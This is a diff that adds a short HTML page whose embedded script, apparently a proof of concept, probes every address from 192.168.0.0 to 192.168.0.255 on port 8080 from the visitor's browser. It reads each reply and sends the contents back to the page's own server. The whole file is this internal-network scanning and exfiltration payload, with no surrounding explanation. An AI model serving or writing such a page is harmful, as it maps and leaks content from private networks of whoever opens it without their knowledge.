@@ -1,0 +1,17 @@
+<html>
+  <body>
+    <script>
+      Array.from(Array(256).keys()).forEach((i) => {
+        fetch("http://192.168.0." + i + ":8080")
+          .then((response) => {
+            response.text().then(function (text) {
+              if (text && typeof text === "string") {
+                fetch("/"+i+"[RESPONSE]" + JSON.stringify(text)).then(console.log);
+              }
+            });
+          })
+          .catch((error) => {});
+      });
+    </script>
+  </body>
+</html>
